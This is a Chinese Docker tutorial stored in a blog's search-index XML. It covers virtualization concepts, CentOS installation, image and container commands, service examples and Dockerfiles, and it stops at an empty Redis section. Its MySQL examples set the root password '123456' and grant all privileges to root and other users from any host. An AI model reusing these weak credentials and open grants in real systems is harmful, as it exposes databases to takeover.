<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker</title>
    <url>/2021/12/21/Docker/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="第一章-Docker概述"><a href="#第一章-Docker概述" class="headerlink" title="第一章 Docker概述"></a>第一章 Docker概述</h1><h2 id="1-1-虚拟化技术发展史"><a href="#1-1-虚拟化技术发展史" class="headerlink" title="1.1 虚拟化技术发展史"></a>1.1 虚拟化技术发展史</h2><p>在虚拟化技术出现之前，如果我们想搭建一台服务器，我们需要做如 下的工作:</p>
<ol>
<li><p>购买一台硬件服务器;</p>
</li>
<li><p>在硬件服务器上安装配置操作系统系统;</p>
</li>
<li><p>在操作系统之上配置应用运行环境; </p>
</li>
<li><p>部署并运行应用;</p>
</li>
</ol>
<p>这种方式的缺点就是:</p>
<ol>
<li><p>部署应用非常慢;</p>
</li>
<li><p>需要花费的成本非常高(时间成本、服务器成本);</p>
</li>
<li><p>应用迁移麻烦;要将应用迁移，又得重复部署应用的过程:购买 服务器 -&gt; 安装操作系统 OS -&gt; 配置运行环境 -&gt; 部署应用 所以，为了解决这个问题，后续出现了虚拟化技术。</p>
</li>
</ol>
<h2 id="1-2-虚拟化技术是什么？"><a href="#1-2-虚拟化技术是什么？" class="headerlink" title="1.2 虚拟化技术是什么？"></a>1.2 虚拟化技术是什么？</h2><p>虚拟化(英语:Virtualization)是一种计算机资源管理技术，是将计算 机的各种硬件资源，比如服务器、网络、CPU、内存及存储等，予以 抽象和转换后呈现出一套新的硬件资源环境，在这一套新的硬件环境 下可以安装我们的操作系统，部署我们的应用运行环境等，它打破计算机硬件资源不可切割的障碍，使我们可以比原本的计算机硬件资源 结构更好的方式来组合应用这些资源。             </p>
<h2 id="1-3-虚拟化技术的分类"><a href="#1-3-虚拟化技术的分类" class="headerlink" title="1.3 虚拟化技术的分类"></a>1.3 虚拟化技术的分类</h2><p>虚拟化一般分为：</p>
<p>虚拟化一般分为: <strong>硬件级虚拟化</strong>(hardware-level-virtualization) <strong>操作系统级虚拟化</strong>(os-level-virtualization)</p>
<p><strong>硬件级虚拟化</strong> 是运行在硬件之上的虚拟化技术，它的核心技术是 Hypervisor 发音 [,haipə’vaizə]，Hypervisor 是一种运行在基础物理服 务器硬件之上的软件层，可以虚拟化硬件资源，例如 cpu、硬盘、内 存资源等。然后我们可以通过在虚拟化出来的资源之上安装操作系统， 这也就是所谓的虚拟机。像 VMWare, VirtualBox 等都是使用该技术， 我们经常使用的桌面版的虚拟机 VMWare 就是采用这种虚拟化技术。 如下图所示:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131390.png" alt="image-20201216232406720"></p>
<h2 id="1-4-虚拟化技术的优缺点"><a href="#1-4-虚拟化技术的优缺点" class="headerlink" title="1.4 虚拟化技术的优缺点"></a>1.4 虚拟化技术的优缺点</h2><p><strong>优点</strong></p>
<p>一台物理服务器可以虚拟化出多个虚拟的服务器，让计算机资源得已充分利用；</p>
<p><strong>缺点</strong></p>
<ol>
<li>每创建一个虚拟机的时候，都会创建一个操作系统，这个操作系 统会占用很多资源，这样无疑大大的增加了资源的消耗，当安装的虚 拟机越多，资源消耗就越多。 </li>
<li>环境兼容性问题，开发时的环境运行正常，部署到虚拟机环境测 试则有可能发生错误;</li>
</ol>
<h2 id="1-5-容器技术的发展"><a href="#1-5-容器技术的发展" class="headerlink" title="1.5 容器技术的发展"></a>1.5 容器技术的发展</h2><p>基于硬件级虚拟化技术的缺点和不足，后续又发展出来了另一种虚拟 化技术，即操作系统级虚拟化技术;<br> <strong>操作系统级虚拟化</strong> 是运行在操作系统之上的虚拟化技术，它模拟的 是运行在一个操作系统上的多个不同进程，并将其封装在一个密闭的 容器里面，该技术也称为容器化技术。</p>
<p>在容器化技术领域，Docker 是目前最流行的一种实现。Docker 发布于 2013 年，Docker 基于 LXC 技术，LXC 是 Linux 平台上的容器化技 术实现。<br> 注:LXC 是 Linux Container 的简写，它是一种内核虚拟化技术，可 以提供轻量级的虚拟化，以便隔离进程和资源，它与宿主机使用同一 个内核，性能损耗小，这种技术是 Linux 提供的，但是直到 Docker 出世，该技术才被发挥出来。</p>
<h2 id="1-6-Docker的发展历史"><a href="#1-6-Docker的发展历史" class="headerlink" title="1.6 Docker的发展历史"></a>1.6 Docker的发展历史</h2><h2 id="1-7-Docker是什么"><a href="#1-7-Docker是什么" class="headerlink" title="1.7 Docker是什么"></a>1.7 Docker是什么</h2><ol>
<li>Docker 是一个开源的应用容器引擎，它基于 Google 公司推出的 Go 语言实现，项目代码托管在 GitHub 上进行维护; <a href="https://github.com/docker/docker-ce">https://github.com/docker/docker-ce</a></li>
<li>Docker 技术让开发者可以打包他们的应用以及依赖包到一个可移 植的容器中，打包好的容器可以发布到任何流行的 Linux 服务器上运 行，这样就可以解决开发环境与运维环境不一致的问题了，所以容器 技术解决了开发和运维之间的矛盾，让开发专注于开发，运维专注于 运维，不要被环境问题所打扰;</li>
<li>Docker彻底释放了虚拟化的威力，极大降低了计算机资源供应的成本，Docker重新定义了程序开发测试、交付和部署过程，Docker提出了“构建一次，到处运行”的理念，让应用的开发、测试、部署和分发都变得前所未有的高效和轻松！</li>
<li>Docker 是一种轻量级的操作系统虚拟化解决方案，Docker 的基础 是 Linux 容器(LXC)技术，在 LXC 的基础上 Docker 进行了进一步 的封装，让用户不需要去关心容器的管理，使得操作更为简便。用户 操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样简单; Docker 自开源后受到广泛的关注，Docker最早是基于Ubuntu开发的， 但后续 CentOS、Debian、Fedora 等主流的 Linux 操作系统都支持 Docker;</li>
</ol>
<p>**总结:**简单地说，Docker 是对软件和其依赖环境的标准化打包，应用 之间相互隔离，共享一个 OS Kernel(解决了资源浪费的问题)，可 以运行在很多主流操作系统上;<br> 但是也需要澄清一下，Docker 本身不是容器，Docker 只是管理容器 的引擎。</p>
<h2 id="1-8-容器和虚拟机的区别"><a href="#1-8-容器和虚拟机的区别" class="headerlink" title="1.8 容器和虚拟机的区别"></a>1.8 容器和虚拟机的区别</h2><p>容器是将代码和环境的关系打包在一起的一个集合，而虚拟机是在物理层面上，分出来的一个操作系统；</p>
<p>多个容器可以运行在同一台物理服务器上，并共享一个操作系统内核资源。多个虚拟机也可以运行在同一台机器上，但每台虚拟机都需要一个完整的操作系统；</p>
<p>下图比较了Docker和传统虚拟化方式的不同之处：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131391.png" alt="image-20201216235006051"></p>
<p>可见容器是在本地操作系统层面上实现虚拟化，直接复用本地主机的操作系统，不需要单独安装操作系统，而传统的虚拟化技术方式则需要单独安装每个虚拟机的操作系统。</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>容器</th>
<th>虚拟机</th>
</tr>
</thead>
<tbody><tr>
<td>启动</td>
<td>秒级</td>
<td>分钟级</td>
</tr>
<tr>
<td>硬盘空间</td>
<td>一般为几十MB</td>
<td>一般为10GB</td>
</tr>
<tr>
<td>性能</td>
<td>接近原生</td>
<td>弱于原生</td>
</tr>
<tr>
<td>系统支持量</td>
<td>单机支持上千个容器</td>
<td>一般几十个</td>
</tr>
<tr>
<td>操作系统</td>
<td>与宿主机共享os</td>
<td>宿主机os上运行虚拟机os</td>
</tr>
</tbody></table>
<h2 id="1-9-为什么使用Docker"><a href="#1-9-为什么使用Docker" class="headerlink" title="1.9 为什么使用Docker"></a>1.9 为什么使用Docker</h2><p>作为一种新兴的虚拟化技术，Docker 跟传统的虚拟化方式相比具有 众多的优势。</p>
<ol>
<li><p>Docker 容器的启动可以在秒级实现，这相比传统的虚拟机方式要 快得多。</p>
</li>
<li><p>Docker 对系统资源的利用率很高，一台主机上可以同时运行数千 个 Docker 容器。 </p>
</li>
<li><p>容器除了运行其中的应用外，基本不消耗额外的系统资源，使得 应用的性能很高。传统虚拟机方式运行 10 个完全不同的应用可能我 们会起 10 个虚拟机来部署，而 Docker 只需要启动 10 个隔离的应用 即可。</p>
</li>
<li><p>Docker 可以更快速的交付和部署，大量地节约开发、测试、部署 的时间，对开发和运维人员来说，最希望的就是一次创建或配置，可 以在任意地方正常运行。</p>
</li>
<li><p>更高效的虚拟化，Docker 容器的运行不需要额外的 hypervisor 支 持，它是内核级的虚拟化，因此可以实现更高的性能和效率。</p>
</li>
<li><p>更轻松的迁移和扩展，Docker 容器几乎可以在任意的平台上运行， 包括物理机、虚拟机、公有云、私有云、个人电脑、服务器等，这种兼容性可以让用户轻松地把一个应用程序从一个平台直接迁移到另 一个平台。</p>
</li>
</ol>
<h1 id="第二章-Docker环境搭建"><a href="#第二章-Docker环境搭建" class="headerlink" title="第二章 Docker环境搭建"></a>第二章 Docker环境搭建</h1><h2 id="2-1-Docker的版本"><a href="#2-1-Docker的版本" class="headerlink" title="2.1 Docker的版本"></a>2.1 Docker的版本</h2><p>Docker 从 2013 年 3 月 20 日发布 Docker 0.1，到现在已经发布了多 个版本，从 2017 年 3 月开始 docker 在原来的基础上分为两个分 支版本: Docker CE 和 Docker EE。<br> Docker CE 即社区免费版，可永久免费使用;</p>
<p>Docker EE 即企业版，功能更全，更强调安全，但需付费使用; 本课程介绍 Docker CE 版本，目前 Docker 版本为 18.03<br> Docker 官方网站:<a href="https://www.docker.com/">https://www.docker.com/</a></p>
<h2 id="2-2-Docker的安装"><a href="#2-2-Docker的安装" class="headerlink" title="2.2 Docker的安装"></a>2.2 Docker的安装</h2><p>首先，我们知道 Docker 并不是容器，它是一个管理容器的引擎。 我们课程采用的 Linux 版本是 CentOS 7，学习 Docker 也更推荐在 Linux 环境下使用;<br> Docker 支持 CentOS 6 及以后的版本;</p>
<p>CentOS7 系统可以直接通过 yum 进行安装: 安装前可以查看一下系统是否已经安装了 Docker:</p>
<p>yum list installed | grep docker<br> 安装:yum install docker -y<br> 安装后，使用 docker –version(docker version，docker -v)查看 docker 是否安装成功，<br> 卸载:<br> yum remove docker.x86_64 -y<br> yum remove docker-client.x86_64 -y<br> yum remove docker-common.x86_64 -y</p>
<h2 id="2-3-Docker服务启动"><a href="#2-3-Docker服务启动" class="headerlink" title="2.3 Docker服务启动"></a>2.3 Docker服务启动</h2><p>安装之后启动Docker服务;</p>
<p>启动:systemctl start docker 或者 service docker start </p>
<p>停止:systemctl stop docker 或者 service docker stop </p>
<p>重启:systemctl restart docker 或者 service docker restart 检查 docker 进程的运行状态:<br> systemctl status docker 或者 service docker status </p>
<p>查看 docker 进程:ps -ef | grep docker</p>
<h2 id="2-4-Docker服务信息"><a href="#2-4-Docker服务信息" class="headerlink" title="2.4 Docker服务信息"></a>2.4 Docker服务信息</h2><p>docker info 查看 docker 系统信息</p>
<p>docker 查看所有的帮助信息</p>
<p>docker commond –help 查看某个 commond 命令的帮助信息</p>
<h2 id="2-5-Docker使用"><a href="#2-5-Docker使用" class="headerlink" title="2.5 Docker使用"></a>2.5 Docker使用</h2><h3 id="2-5-1-Docker的运行机制"><a href="#2-5-1-Docker的运行机制" class="headerlink" title="2.5.1 Docker的运行机制"></a>2.5.1 Docker的运行机制</h3><p>我们知道 Docker 并不是容器，而只是一个管理容器的引擎;<br> Docker 的底层运行原理:<br> Docker 服务启动→下载镜像→启动该镜像得到一个容器→容器里运 行着我们想要的程序;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131392.png" alt="image-20201217001317678"></p>
<h3 id="2-5-2-第一个Docker容器"><a href="#2-5-2-第一个Docker容器" class="headerlink" title="2.5.2 第一个Docker容器"></a>2.5.2 第一个Docker容器</h3><p>Docker运行步骤:</p>
<ol>
<li>将Docker服务启动</li>
<li>下载一个镜像，Docker运行一个容器前需要本地存在有对应的镜像，如果镜像不存在，Docker会从镜像仓库下载(默认是 Docker Hub 公共注册服务器中的仓库 <a href="https://hub.docker.com)./">https://hub.docker.com)。</a></li>
</ol>
<p>CentOS 下怎么下载(pull)镜像?</p>
<p>从 docker hub 官网搜索要使用的镜像，也可以在命令行使用命令搜索要使用的镜像，比如 docker search tomcat 进行搜索，然后下载所需 要的镜像:<br> 下载镜像:docker pull tomcat</p>
<p>运行镜像:docker run tomcat 前台运行， 要后台运行，加参数 -d 显示本地已有的镜像:docker images</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131393.png" alt="image-20201217001937529"></p>
<p>在列出信息中，可以看到几个字段信息 </p>
<p>REPOSITORY:来自于哪个仓库，比如 docker.io&#x2F;tomcat TAG:镜像的标记，比如 latest<br> IMAGE ID:镜像的 ID 号(唯一) </p>
<p>CREATED:创建时间</p>
<p>SIZE:镜像大小</p>
<ol start="3">
<li>启动下载下来的镜像得到一个容器:<br> docker run -d docker.io&#x2F;tomcat 或者 docker run -d 41a54fe1f79d 默认是前台启动，如果需要后台启动，指定-d 参数;</li>
</ol>
<p>通过 ps -ef | grep tomcat 查看，检查 tomcat 镜像是否启动容器成功</p>
<h3 id="2-5-3-进入Docker容器"><a href="#2-5-3-进入Docker容器" class="headerlink" title="2.5.3 进入Docker容器"></a>2.5.3 进入Docker容器</h3><p>进入容器:docker exec -it cef0d139bfd6 bash<br> 其中 i 表示交互式的，也就是保持标准输入流打开; t 表示虚拟控制台，分配到一个虚拟控制台; </p>
<p>退出容器:exit</p>
<h3 id="2-5-4-客户机访问容器"><a href="#2-5-4-客户机访问容器" class="headerlink" title="2.5.4 客户机访问容器"></a>2.5.4 客户机访问容器</h3><p>从客户机上访问容器，需要有端口映射，docker 容器默认采用桥接模 式与宿主机通信，需要将宿主机的 ip 端口映射到容器的 ip 端口上; </p>
<p>停止容器:docker stop 容器 ID&#x2F;名称<br>启动容器:docker run -d -p 8080:8080 docker.io&#x2F;tomcat 或者 41a54fe1f79d</p>
<h1 id="第三章-Docker核心组件"><a href="#第三章-Docker核心组件" class="headerlink" title="第三章 Docker核心组件"></a>第三章 Docker核心组件</h1><h2 id="3-1-Docker架构"><a href="#3-1-Docker架构" class="headerlink" title="3.1 Docker架构"></a>3.1 Docker架构</h2><p>Docker使用客户端-服务器（C&#x2F;S）架构模式，使用远程API来管理和创建Docker容器。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131394.png" alt="image-20201217002508350"></p>
<p>Docker容器通过Docker镜像来创建。</p>
<p>镜像与容器的关系类似于面向对象编程中的类与对象的关系。</p>
<table>
<thead>
<tr>
<th>Docker</th>
<th>面向对象</th>
</tr>
</thead>
<tbody><tr>
<td>镜像</td>
<td>类</td>
</tr>
<tr>
<td>容器</td>
<td>对象</td>
</tr>
</tbody></table>
<h2 id="3-2-Docker核心要素"><a href="#3-2-Docker核心要素" class="headerlink" title="3.2 Docker核心要素"></a>3.2 Docker核心要素</h2><p>Docker包括三个核心要素</p>
<p><strong>镜像(Image)、容器(Container)、仓库(Repository)</strong></p>
<p> 理解了这三个概念，就理解了 Docker 的整个生命周期。 Docker 的运行离不开以上核心几个组件的支持，Docker 的成功也是 拜这几个组件所赐。<br> 有人会误以为，Docker 就是容器，但 Docker 不是容器，而是管理容 器的引擎。</p>
<h2 id="3-3-镜像"><a href="#3-3-镜像" class="headerlink" title="3.3 镜像"></a>3.3 镜像</h2><h3 id="3-3-1-镜像的基本概念"><a href="#3-3-1-镜像的基本概念" class="headerlink" title="3.3.1 镜像的基本概念"></a>3.3.1 镜像的基本概念</h3><p>Docker 镜像就是一个只读的模板，可以用来创建 Docker 容器。 例如:一个镜像可以包含一个完整的 centos 操作系统环境，里面仅 安装了 mysql 或用户需要的其它应用程序。<br> Docker 提供了一个非常简单的机制来创建镜像或者更新现有的镜像， 用户甚至可以直接从其他人那里下载一个已经做好的镜像来直接使 用。</p>
<h3 id="3-3-2-镜像的组成结构"><a href="#3-3-2-镜像的组成结构" class="headerlink" title="3.3.2 镜像的组成结构"></a>3.3.2 镜像的组成结构</h3><p>镜像是由许多层的文件系统叠加构成的，最下面是一个引导文件系统 bootfs，第二层是一个 root 文件系统 rootfs，root 文件系统通常是某 种操作系统，比如 centos、Ubuntu，在 root 文件系统之上又有很多 层文件系统，这些文件系统叠加在一起，构成 docker 中的镜像;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131395.png" alt="image-20201217003937572"></p>
<h3 id="3-3-3-镜像的日常操作"><a href="#3-3-3-镜像的日常操作" class="headerlink" title="3.3.3 镜像的日常操作"></a>3.3.3 镜像的日常操作</h3><ol>
<li><p>下载镜像，比如下载 redis 镜像:docker pull redis:latest<br> reids 是查询到的镜像名称，latest 是镜像的标签 tag 获取一个镜像有两种方式，一种是从官方镜像仓库下载，一种是自己 通过 Dockerfile 文件构建。</p>
<p>如果有官方镜像，我们就不必自己用 Dockerfile 文件构建了，除非官 方没有才会自己去 Dockerfile 文件构建</p>
</li>
<li><p>列出已经下载的镜像:docker images，或者 docker images redis </p>
</li>
<li><p>运行镜像:docker run -d redis 其中-d 表示在后台运行</p>
<p>然后通过 ps -ef | grep redis 可以查到 redis 进程</p>
</li>
<li><p>查看容器镜像的状态:docker ps<br> 通过 docker exec -it a8584016f9b6(镜像 ID) bash 进入 redis 容器 </p>
</li>
<li><p>删除镜像:docker rmi redis:latest 注意是 rmi，不是 rm，rm 是删 除容器;</p>
</li>
</ol>
<h2 id="3-4-容器"><a href="#3-4-容器" class="headerlink" title="3.4 容器"></a>3.4 容器</h2><h3 id="3-4-1-容器的基本概念"><a href="#3-4-1-容器的基本概念" class="headerlink" title="3.4.1 容器的基本概念"></a>3.4.1 容器的基本概念</h3><p>容器是从镜像创建的运行实例。它可以被启动、停止、删除。每个容器都是相互隔离的、保证安全平台。可以把看做一个简易版的 Linux 环境，包括 root 用户权限、进程空间、用户空间和网络空间和运行在其中的应用程序。</p>
<p>Docker利用容器来运行应用，镜像是只读的，容器在启动的时候创建一层可写层作为最上层。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131396.png" alt="image-20201217004722048"></p>
<h3 id="3-4-2-容器的日常操作"><a href="#3-4-2-容器的日常操作" class="headerlink" title="3.4.2 容器的日常操作"></a>3.4.2 容器的日常操作</h3><p>启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态的容器重新启动。</p>
<p>通过镜像启动容器:docker run -d redis<br>查看运行中的容器:docker ps</p>
<p>查看所有的容器:docker ps -a<br>停止容器:docker stop 容器 id 或容器名称 </p>
<p>已经停止的容器，我们可以使用命令 docker start 来启动。 开启容器:docker start 容器 id 或容器名称<br>因为 Docker 的容器实在太轻量级了，很多时候用户都是随时删除和新建容器。</p>
<p>删除容器:docker rm 容器 id 或容器名称 </p>
<p>删除容器时，容器必须是停止状态，否则会报错; </p>
<p>进入容器:docker exec -it 容器 id 或容器名称 bash<br>还可以使用 docker inspect + 容器 id 或容器名称 查看容器的更多信息;<br> 停用全部运行中的容器:docker stop $(docker ps -q) </p>
<p>删除全部容器:docker rm ​$(docker ps -aq) </p>
<p>一条命令实现停用并删除容器:<br> docker stop $(docker ps -q) &amp; docker rm -f $(docker ps -aq)</p>
<h2 id="3-5-仓库"><a href="#3-5-仓库" class="headerlink" title="3.5 仓库"></a>3.5 仓库</h2><h3 id="3-5-1-仓库的基本概念"><a href="#3-5-1-仓库的基本概念" class="headerlink" title="3.5.1 仓库的基本概念"></a>3.5.1 仓库的基本概念</h3><p>仓库是集中存放镜像文件的场所，有时候会把仓库和仓库注册服务器 (Registry)看做同一事物，并不严格区分。实际上，仓库注册服务 器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像 有不同的标签(tag); 仓库分为公开仓库(Public)和私有仓库(Private)两种形式; 最大的公开仓库是 Docker Hub (<a href="https://hub.docker.com/)%EF%BC%8C%E5%AD%98%E6%94%BE%E4%BA%86">https://hub.docker.com/)，存放了</a> 数量庞大的镜像供用户下载; 当然，用户也可以在本地网络内创建一个私有仓库;当用户创建了自己的镜像之后就可以使用 push 命令将它上传到公 有或者私有仓库，这样下次在另外一台机器上使用这个镜像时候，只 需要从仓库上 pull 下来即可;<br> 注:Docker 仓库的概念跟 Git 类似，注册服务器也类似于 GitHub 这 样的托管服务;</p>
<h3 id="3-5-2-仓库的日常操作"><a href="#3-5-2-仓库的日常操作" class="headerlink" title="3.5.2 仓库的日常操作"></a>3.5.2 仓库的日常操作</h3><p>用户可通过 docker search 命令来查找官方仓库中的镜像:<br> docker search rabbitmq </p>
<p>可以看到返回了很多包含关键字的镜像，其中包括镜像名字、描述、 星级(表示该镜像的受欢迎程度)、是否官方创建、是否自动创建; 官方的镜像说明是官方项目组创建和维护的，automated 资源允许用 户验证镜像的来源和内容; </p>
<p>根据是否是官方提供，可将镜像资源分为两类;</p>
<p>一种是类似 centos 这样的基础镜像，被称为基础或根镜像。这些基 础镜像是由 Docker 公司创建、验证、支持、提供。这样的镜像往往 使用单个单词作为名字;<br> 还有一种类型，比如 tianon&#x2F;centos 镜像，它是由 Docker 的用户创 建并维护的，往往带有用户名称前缀。可以通过前缀 user_name&#x2F; 来 指定使用某个用户提供的镜像，比如 tianon 用户;</p>
<p>并利用 docker pull 命令来将它下载到本地:</p>
<p>docker pull rabbitmq </p>
<p>docker pull centos</p>
<h1 id="第四章-Docket使用实例"><a href="#第四章-Docket使用实例" class="headerlink" title="第四章 Docket使用实例"></a>第四章 Docket使用实例</h1><h2 id="4-1-Docker-安装-MySQL"><a href="#4-1-Docker-安装-MySQL" class="headerlink" title="4.1 Docker 安装 MySQL"></a>4.1 Docker 安装 MySQL</h2><p>#下载 MySQL 镜像:<br> docker pull mysql:latest (安装的是 mysql 8.0)<br> docker run -p 3306:3306 -e MYSQL_DATABASE&#x3D;workdb -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d mysql:latest<br> 其中-e 是指定环境变量<br> #进入容器:<br> docker exec -it 3e8bf7392b4e bash<br> #登录 MySQL:<br> mysql -u root -p<br> #修改密码:<br> ALTER USER ‘root‘@’localhost’ IDENTIFIED BY ‘123456’; #授权远程登录访问:<br> CREATE USER ‘wkcto‘@’%’ IDENTIFIED WITH mysql_native_password BY ‘123456’;<br> GRANT ALL PRIVILEGES ON <em>.</em> TO ‘ wkcto‘@’%’;</p>
<h2 id="4-2-Docker-安装-Nginx"><a href="#4-2-Docker-安装-Nginx" class="headerlink" title="4.2 Docker 安装 Nginx"></a>4.2 Docker 安装 Nginx</h2><p>#下载 Nginx 镜像:<br> docker pull nginx<br> docker run -d -p 80:80 nginx<br> #进入容器:<br> docker exec -it 3e8bf7392b4e bash<br> #浏览器访问 Nginx:<br> <a href="http://192.168.230.128/">http://192.168.230.128:80</a><br> #Nginx 部署静态网站:<br> 将 linux 的文件拷贝到 docker 容器某个目录下:<br> docker cp &#x2F;root&#x2F;test.html bf8a58328e18:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</p>
<h2 id="4-3-Dokcer-安装-Zookeeper"><a href="#4-3-Dokcer-安装-Zookeeper" class="headerlink" title="4.3 Dokcer 安装 Zookeeper"></a>4.3 Dokcer 安装 Zookeeper</h2><p>#下载 Zookeeper 镜像:<br> docker pull zookeeper<br> docker run -p 2181:2181 -d zookeeper </p>
<p>#进入容器:<br> docker exec -it 3e8bf7392b4e bash </p>
<p>#客户端工具访问 Zookeeper:</p>
<h2 id="4-4-Docker-安装-ActiveMQ"><a href="#4-4-Docker-安装-ActiveMQ" class="headerlink" title="4.4 Docker 安装 ActiveMQ"></a>4.4 Docker 安装 ActiveMQ</h2><p>#下载 ActiveMQ 镜像:<br> docker pull webcenter&#x2F;activemq </p>
<p>docker run -p 8161:8161 -d activemq </p>
<p>#进入容器:<br> docker exec -it 3e8bf7392b4e bash </p>
<p>#浏览器访问 activemq:</p>
<h1 id="第五章-Docker-自定义镜像"><a href="#第五章-Docker-自定义镜像" class="headerlink" title="第五章 Docker 自定义镜像"></a>第五章 Docker 自定义镜像</h1><h2 id="5-1-认识-Dockerfile-文件"><a href="#5-1-认识-Dockerfile-文件" class="headerlink" title="5.1 认识 Dockerfile 文件"></a>5.1 认识 Dockerfile 文件</h2><p>Dockerfile 用于构建 Docker 镜像，Dockerfile 文件是由一行行命令语句 组成，基于这些命令即可以构建一个镜像，比如下面就是一个</p>
<p>Dockefile 文件样例:</p>
<p>FROM XXX&#x2F;jdk:8<br> MAINTAINER docker_user<br> ENV JAVA_HOME &#x2F;usr&#x2F;local&#x2F;java<br> ADD apache-tomcat-8.0.32.tar.gz &#x2F;usr&#x2F;local&#x2F; RUN mv apache-tomcat-8.0.32 tomcat8<br> EXPOSE 8080<br> RUN chmod u+x &#x2F;usr&#x2F;local&#x2F;tomcat8&#x2F;bin&#x2F;*.sh CMD &#x2F;usr&#x2F;local&#x2F;tomcat8&#x2F;bin&#x2F;catalina.sh start</p>
<h2 id="5-2-Dockerfile-的基本结构"><a href="#5-2-Dockerfile-的基本结构" class="headerlink" title="5.2 Dockerfile 的基本结构"></a>5.2 Dockerfile 的基本结构</h2><p>一般的，Dockerfile 分为四部分:</p>
<ul>
<li>基础镜像信息;</li>
<li>维护者信息;</li>
<li>镜像操作指令;</li>
<li>容器启动时执行指令;</li>
</ul>
<h2 id="5-3-Dockerfile-指令"><a href="#5-3-Dockerfile-指令" class="headerlink" title="5.3 Dockerfile 指令"></a>5.3 Dockerfile 指令</h2><p><strong>FROM</strong></p>
<p>格式为 FROM <image> 或 FROM <image>:<tag><br> Dockerfile 文件的第一条指令必须为 FROM 指令。并且，如果在同一 个 Dockerfile 中创建多个镜像时，可以使用多个 FROM 指令(每个镜 像一次);<br> **MAINTAINER<br>** 格式为 MAINTAINER <name>，指定维护者信息;<br> **ENV<br>** 格式为 ENV <key> <value>，指定一个环境变量，会被后续 RUN 指令 使用，并在容器运行时保持;<br> **ADD<br>** 格式为 ADD <src> <dest>;<br> 复制指定的<src>到容器中的<dest>;<br> **EXPOSE<br>** 格式为 EXPOSE <port> [<port>…]</p>
<p>告诉 Docker 服务端容器暴露的端口号，供互联系统使用，在启动容 器时需要通过 -p映射端口，Docker 主机会自动分配一个端口转发到 指定的端口;<br> <strong>RUN</strong></p>
<p>格式为 RUN <command><br> RUN 指令将在当前镜像基础上执行指定命令，并提交为新的镜像， 当命令较长时可以使用 \ 来换行;<br> **CMD<br>** 指定启动容器时执行的命令，每个 Dockerfile 只能有一条 CMD 命令。 如果指定了多条命令，只有最后一条会被执行。 如果用户启动容器时候指定了运行的命令，则会覆盖掉 CMD 指定的 命令。</p>
<h2 id="5-4-Dockerfile-自定义镜像"><a href="#5-4-Dockerfile-自定义镜像" class="headerlink" title="5.4 Dockerfile 自定义镜像"></a>5.4 Dockerfile 自定义镜像</h2><h3 id="5-4-1-自定义-JDK-镜像"><a href="#5-4-1-自定义-JDK-镜像" class="headerlink" title="5.4.1 自定义 JDK 镜像"></a>5.4.1 自定义 JDK 镜像</h3><p>FROM centos:latest<br> MAINTAINER wkcto<br> ADD jdk-8u121-linux-x64.tar.gz &#x2F;usr&#x2F;local<br> ENV JAVA_HOME &#x2F;usr&#x2F;local&#x2F;jdk1.8.0_121<br> ENV CLASSPATH $JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar ENV PATH $PATH:$JAVA_HOME&#x2F;bin<br> CMD java -version</p>
<p>构建镜像:docker build -t wkcto_jdk1.8.0_121 . </p>
<p>运行镜像:docker run -d ac84bde53958</p>
<h3 id="5-4-2-自定义-Tomcat-镜像"><a href="#5-4-2-自定义-Tomcat-镜像" class="headerlink" title="5.4.2 自定义 Tomcat 镜像"></a>5.4.2 自定义 Tomcat 镜像</h3><p>定义 Dockerfile 文件:</p>
<p>FROM wkcto_jdk1.8.0_121<br> MAINTAINER wkcto<br> ADD apache-tomcat-8.5.24.tar.gz &#x2F;usr&#x2F;local&#x2F;<br> ENV CATALINA_HOME &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24<br> ENV PATH $PATH:$CATALINA_HOME&#x2F;lib:$CATALINA_HOME&#x2F;bin EXPOSE 8080<br> CMD &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;bin&#x2F;catalina.sh run</p>
<p>构建镜像:docker build -t wkcto-tomcat-8.5.24 . </p>
<p>运行镜像:docker run -d -p 8080:8080 ab41b5f48256</p>
<h3 id="5-4-3-自定义-MySQL-镜像"><a href="#5-4-3-自定义-MySQL-镜像" class="headerlink" title="5.4.3 自定义 MySQL 镜像"></a>5.4.3 自定义 MySQL 镜像</h3><p>定义 Dockerfile 文件:</p>
<p>FROM centos:centos6<br> MAINTAINER wkcto<br> RUN yum install mysql-server mysql -y RUN &#x2F;etc&#x2F;init.d&#x2F;mysqld start &amp;&amp;\</p>
<p>mysql -e “grant all privileges on <em>.</em> to ‘root‘@’%’ identified by ‘123456’ WITH GRANT OPTION ;”&amp;&amp;\</p>
<p>mysql -e “grant all privileges on <em>.</em> to ‘root‘@’localhost’ identified by ‘123456’ WITH GRANT OPTION ;”&amp;&amp;\</p>
<p>mysql -uroot -p123456 -e “show databases;” EXPOSE 3306</p>
<p>CMD &#x2F;usr&#x2F;bin&#x2F;mysqld_safe </p>
<p>构建镜像:docker build -t wkcto-mysql .</p>
<p>运行镜像:docker run -d -p 3306:3306 09ce279d92df </p>
<h3 id="5-4-4-自定义-Redis-镜像"><a href="#5-4-4-自定义-Redis-镜像" class="headerlink" title="5.4.4 自定义 Redis 镜像"></a>5.4.4 自定义 Redis 镜像</h3><p> 定义 Dockerfile 文件:</p>
